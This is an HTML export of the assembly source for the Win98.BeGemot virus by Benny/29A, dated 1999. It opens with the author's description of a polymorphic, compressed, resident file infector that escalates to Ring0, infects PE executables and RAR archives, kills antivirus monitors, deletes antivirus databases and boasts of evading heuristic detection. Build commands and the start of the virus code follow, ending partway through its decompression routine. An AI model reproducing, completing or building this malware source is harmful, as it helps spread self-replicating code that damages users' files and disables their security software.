<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;                                                     ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹</span><span class="sc0">
</span><span class="sc1">;                                                     €€€ €€€ €€€ €€€ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;          Win98.BeGemot.8192                         ‹‹‹€€ﬂ  ﬂ€€€€€€ €€€€€€€</span><span class="sc0">
</span><span class="sc1">;          by Benny/29A                               €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;                                                     €€€€€€€ €€€€€€ﬂ €€€ €€€</span><span class="sc0">
</span><span class="sc1">;                                                    </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Author's description</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I'm very proud to introduce my best virus. I wanted to show ya in this virus,</span><span class="sc0">
</span><span class="sc1">;what everything I can. There aren't all my favourite techniques (such as</span><span class="sc0">
</span><span class="sc1">;Memory Mapped Files), nevertheless I think this is a good virus. I tried to</span><span class="sc0">
</span><span class="sc1">;optimize it as much as I could, but there is still for sure something, that</span><span class="sc0">
</span><span class="sc1">;could be optimized much more than it is. But that's a life... I call it</span><span class="sc0">
</span><span class="sc1">;Win98 infector coz I tested it only on my Win98 machine. It should work on</span><span class="sc0">
</span><span class="sc1">;Win95 also, but devil never sleeps. I'm not sure, so that's why I call it</span><span class="sc0">
</span><span class="sc1">;Win98. Hmmmm, okay, that was the foreword, and now here is that promised</span><span class="sc0">
</span><span class="sc1">;description...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This virus is the Win98 resident/semi-stealth/compressed/slow poly/Pentium+/</span><span class="sc0">
</span><span class="sc1">;multithreaded/Ring3/Ring0/PE/RAR/fast infector. It also deletes some AV</span><span class="sc0">
</span><span class="sc1">;databases/killin some AV monitors/uses VxDCall0 backdoor to call DOS</span><span class="sc0">
</span><span class="sc1">;services/usin' undocumented opcode and can infect EXE/SCR/RAR/SFX/CPL/DAT/BAK</span><span class="sc0">
</span><span class="sc1">;files. It appends to last section in PE files/inserts Win9X dropper into RAR</span><span class="sc0">
</span><span class="sc1">;files and enlarge files with constant size, that's 8192 bytes. (I decided,</span><span class="sc0">
</span><span class="sc1">;this is perfect number, noone will mind.) It uses BPE32 (Benny's Polymorphic</span><span class="sc0">
</span><span class="sc1">;Engine for Win32, published in DDT#1) and BCE32 (published in 29A#4) engines.</span><span class="sc0">
</span><span class="sc1">;BPE32 has perfect SEH trick (it fools many AVs) and BCE32 saves about 1,9kB</span><span class="sc0">
</span><span class="sc1">;of virus code (!!!). Combination of these engines is my virus, that is (in</span><span class="sc0">
</span><span class="sc1">;this time - summer 1999) undetectable by any heuristic methods (only first</span><span class="sc0">
</span><span class="sc1">;generation of virus is detectable). I tested it with DrWeb (IMO the best AV),</span><span class="sc0">
</span><span class="sc1">;NODICE32 (IMO the second best), AVP (perfect scanner, but...) and many otherz.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;But that's not all. If virus will get resident in memory, virus will jump to</span><span class="sc0">
</span><span class="sc1">;Ring0, it create VMM thread (system thread) which will patch Ring3 code and so</span><span class="sc0">
</span><span class="sc1">;allow Ring3 code execution and leave Ring0. Ring3 code will run on, while</span><span class="sc0">
</span><span class="sc1">;thread will run in memory on the background. Thread will allocate 1kB of</span><span class="sc0">
</span><span class="sc1">;shared memory (memory accesible to all processes) and slowly check for</span><span class="sc0">
</span><span class="sc1">;changes in it. If any change will appear, thread will do property action,</span><span class="sc0">
</span><span class="sc1">;dependin' on change. Why? I coded next to BG communication console, called</span><span class="sc0">
</span><span class="sc1">;BGVCC (BeGemot Virus Communication Console), so if virus is resident in</span><span class="sc0">
</span><span class="sc1">;memory, u can easily communicate with virus thread by it. Look at BGVCC</span><span class="sc0">
</span><span class="sc1">;source and u will see, how can u easily communicate with/control virus.</span><span class="sc0">
</span><span class="sc1">;This is the first virus with communication interface.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;It also uses many trix to fool AVs, e.g. SEH, spec. thread, RETF etc...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Vocabulary (these words r often used)</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       BG        -     Win98.BeGemot, this virus.</span><span class="sc0">
</span><span class="sc1">;       BGVCC     -     BeGemot Virus Communication Console, utility included</span><span class="sc0">
</span><span class="sc1">;                       with this virus for controlin' BG and communicatin'</span><span class="sc0">
</span><span class="sc1">;                       with it.</span><span class="sc0">
</span><span class="sc1">;       BGCB      -     BeGemot Control Block. If u watch any system manual,</span><span class="sc0">
</span><span class="sc1">;                       u will see THCB (Thread Control Block), VMCB (Virtual</span><span class="sc0">
</span><span class="sc1">;                       Machine Control Block), etc. I decided, BGCB is rite</span><span class="sc0">
</span><span class="sc1">;                       abbreviation for callin' this, really system block.</span><span class="sc0">
</span><span class="sc1">;                       It holds all items, that r used to communicate with</span><span class="sc0">
</span><span class="sc1">;                       BG / BG thread.</span><span class="sc0">
</span><span class="sc1">;       BG thread -     VMM thread, which manages BGCB.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;What will happen on execution ?</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Virus will:</span><span class="sc0">
</span><span class="sc1">;1) Decrypt it's body by polymorphic decryptor</span><span class="sc0">
</span><span class="sc1">;2)     Decompress virus body</span><span class="sc0">
</span><span class="sc1">;3)     Check, if it is already resident.</span><span class="sc0">
</span><span class="sc1">;4)     Try to find VxDCall0 API</span><span class="sc0">
</span><span class="sc1">;5)     Install virus to memory</span><span class="sc0">
</span><span class="sc1">;6)     Kill some AV monitors (AVP, NODICE)</span><span class="sc0">
</span><span class="sc1">;7)     Jump to host</span><span class="sc0">

</span><span class="sc1">;Virus in memory will:</span><span class="sc0">
</span><span class="sc1">;1)     Check requested service</span><span class="sc0">
</span><span class="sc1">;       -       size stealth stage (stealth and quit)</span><span class="sc0">
</span><span class="sc1">;       -       infection stage (continue)</span><span class="sc0">
</span><span class="sc1">;2)     Check filename</span><span class="sc0">
</span><span class="sc1">;3)     Jump to Ring0 (by modifyin' IDT)</span><span class="sc0">
</span><span class="sc1">;4)     Create new thread</span><span class="sc0">
</span><span class="sc1">;5)     Exit from Ring0</span><span class="sc0">
</span><span class="sc1">;6)     Infect file</span><span class="sc0">
</span><span class="sc1">;7)     Delete some AV files</span><span class="sc0">
</span><span class="sc1">;8)     Jump to previous handler</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;AVP's description</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Benny's notes: This is the worst description I have ever seen for so large</span><span class="sc0">
</span><span class="sc1">;virus as BeGemot is. U can see my notes in [* *]. Well, here is it:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Win95.Begemot [* It's not fully compatible with Win95, but with Win98 only *]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This is a dangerous [* why dangerous?! *] memory resident parasitic</span><span class="sc0">
</span><span class="sc1">;polymorphic Windows virus about 8Kb of length. The virus installs itself into</span><span class="sc0">
</span><span class="sc1">;the Windows memory [* shared memory! *] and infects PE EXE files [* and RAR</span><span class="sc0">
</span><span class="sc1">;files *] that are accessed. The virus uses system calls that are valid under</span><span class="sc0">
</span><span class="sc1">;Win95/98 only [* blah, some calls r valid only in Win98 *] and can't spread</span><span class="sc0">
</span><span class="sc1">;under NT. The virus also has bugs and often halts the system when run [* which</span><span class="sc0">
</span><span class="sc1">;one?! *]. The virus uses several unusual routines in its code: keeps its code</span><span class="sc0">
</span><span class="sc1">;encrypted and compressed in affected files (while installing it decompresses</span><span class="sc0">
</span><span class="sc1">;it); infects RAR archives (adds infected BEER.EXE file [* dropper! *] to</span><span class="sc0">
</span><span class="sc1">;archives); runs a thread that can communicate with external module [* u mean</span><span class="sc0">
</span><span class="sc1">;BGVCC? *] which controls the virus (for example, enables/disables infection</span><span class="sc0">
</span><span class="sc1">;routine) [* I thought u will talk much more about BGVCC *].</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus also looks for "AVP Monitor" and "Amon Antivirus Monitor" windows</span><span class="sc0">
</span><span class="sc1">;and closes them; deletes several anti-virus data files; depending on the</span><span class="sc0">
</span><span class="sc1">;system timer displays a message [* u forgot it or why u can't write here</span><span class="sc0">
</span><span class="sc1">;what message it is?! *].</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The virus also contains the "copyright" text: </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus Win98.BeGemot by Benny/29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;[* That's all about my 8kB virus, Kasperpig?! *]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Payload</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Every execution virus test tick counter for 22h value. If matches, virus will</span><span class="sc0">
</span><span class="sc1">;display MessageBox.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Greetz</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Darkman/29A.... U said Amsterdam? Hmmm, prepare yourself for bath</span><span class="sc0">
</span><span class="sc1">;                       in the river :-)).</span><span class="sc0">
</span><span class="sc1">;       Super/29A...... w0rkoholic!</span><span class="sc0">
</span><span class="sc1">;       GriYo/29A...... So here is it with threads. HPS r0x, kewl tutes...</span><span class="sc0">
</span><span class="sc1">;                       Thanx for all...</span><span class="sc0">
</span><span class="sc1">;       Billy_Bel...... DDT#1 r0x0r, no lie! Maybe, ehrm... VX and politix,</span><span class="sc0">
</span><span class="sc1">;                       that ain't rite combination.</span><span class="sc0">
</span><span class="sc1">;       mgl............ .CZ/.SK RULEZ !!!</span><span class="sc0">
</span><span class="sc1">;       IntelServ...... Tell me, how is that feelin', when u know, that</span><span class="sc0">
</span><span class="sc1">;                       everybody hates u!</span><span class="sc0">
</span><span class="sc1">;       Kaspersky...... That's all u can?!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;How to build</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       tasm32 -ml -q -m9 bg.asm</span><span class="sc0">
</span><span class="sc1">;       tlink32 -Tpe -c -x -aa -r bg.obj,,, import32</span><span class="sc0">
</span><span class="sc1">;       pewrsec.com bg.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;For who is this dedicated?</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;I dunno yet. But I can say, for who ain't this virus dedicated. It ain't for</span><span class="sc0">
</span><span class="sc1">;ppl such as IntelServ, for jerx, for stupid ppl, for intolerate ppl, for</span><span class="sc0">
</span><span class="sc1">;any fanatic ppl (fascists, capitalistix and communists), for my teachers at</span><span class="sc0">
</span><span class="sc1">;school, for those, who can't use brain, for braggers. This virus is dedicated</span><span class="sc0">
</span><span class="sc1">;for SMART ppl, whoever is it, whatever is color of their skin, wherever is</span><span class="sc0">
</span><span class="sc1">;livin'. Important isn't GRADE, important is what u have in your HEAD!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;(c) 1999 Benny/29A. Enjoy!</span><span class="sc0">



</span><span class="sc2">.586p</span><span class="sc0">                                           </span><span class="sc1">;why not ;)</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">                                     </span><span class="sc1">;FLAT model</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">mz.inc</span><span class="sc0">                                  </span><span class="sc1">;include some important</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pe.inc</span><span class="sc0">                                  </span><span class="sc1">;include-filez</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">


</span><span class="sc5">BG_IDLE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;some equates</span><span class="sc0">
</span><span class="sc5">BG_INFECTINEXEC</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;used</span><span class="sc0">
</span><span class="sc5">BG_INFECTINRAR</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                       </span><span class="sc1">;by communication</span><span class="sc0">
</span><span class="sc5">BG_STEALTHIN</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">;thread</span><span class="sc0">

</span><span class="sc5">PC_WRITEABLE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00020000h</span><span class="sc0">               </span><span class="sc1">;equates used</span><span class="sc0">
</span><span class="sc5">PC_USER</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00040000h</span><span class="sc0">               </span><span class="sc1">;in installation</span><span class="sc0">
</span><span class="sc5">PR_SHARED</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80060000h</span><span class="sc0">               </span><span class="sc1">;stage</span><span class="sc0">
</span><span class="sc5">PC_PRESENT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">PC_FIXED</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000008h</span><span class="sc0">
</span><span class="sc5">PD_ZEROINIT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">

</span><span class="sc5">mem_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">virtual_end</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">0fffh</span><span class="sc4">)/</span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc1">;size of virus in</span><span class="sc0">
                                                        </span><span class="sc1">;memory (pages)</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">                          </span><span class="sc1">;used in first</span><span class="sc0">
                                                </span><span class="sc1">;generation only</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">                                           </span><span class="sc1">;data section</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;Start of virus</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;save all regs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc0">                                 </span><span class="sc1">;get delta offset</span><span class="sc0">
</span><span class="sc5">gd</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_compressed_</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;where is compressed virus</span><span class="sc0">
                                                </span><span class="sc1">;stored</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">decompressed</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gd</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;where will be virus</span><span class="sc0">
                                                </span><span class="sc1">;decompressed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                      </span><span class="sc1">;size of compressed virus</span><span class="sc0">
</span><span class="sc5">c_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                        


</span><span class="sc1">;Decompression routine from BCE32 starts here.</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;EAX = 0</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;EBP = 0</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">                 </span><span class="sc1">;EDX = 0</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load decryption key</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load first byte</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                  </span><span class="sc1">;store 8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;store 0</span><span class="sc0">
</span><span class="sc5">d_bits</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;store ECX</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                </span><span class="sc1">;test for 1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">db0</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">               </span><span class="sc1">;test for 00</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">db1</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a0h</span><span class="sc0">               </span><span class="sc1">;test for 010</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">db2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">               </span><span class="sc1">;its 011</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">tb2</span><span class="sc0">
</span><span class="sc5">testb</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;is it 1 ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">p1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;no, store 0</span><span class="sc0">
</span><span class="sc5">_tb_</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;load byte to EAX</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;set bit</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;and make space for next one</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">cbit</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">p1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;store 1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_tb_</span><span class="sc0">                </span><span class="sc1">;and continue</span><span class="sc0">
</span><span class="sc5">db0</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">;CL = 0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">;store 1</span><span class="sc0">
</span><span class="sc5">testbits</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;load parameter</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">;shift to next bit group</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">testb</span><span class="sc0">              </span><span class="sc1">;test bit</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;next bit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">testb</span><span class="sc0">              </span><span class="sc1">;test it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;restore regs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;load parameter</span><span class="sc0">
</span><span class="sc5">bcopy</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">         </span><span class="sc1">;8. bit ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dnlb</span><span class="sc0">                </span><span class="sc1">;nope, continue</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;load next byte</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;and nulify parameter</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;decrement parameter</span><span class="sc0">
</span><span class="sc5">dnlb</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;next bit</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                </span><span class="sc1">;is it 1 ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nb</span><span class="sc0">                   </span><span class="sc1">;no, continue</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;yeah, set bit</span><span class="sc0">
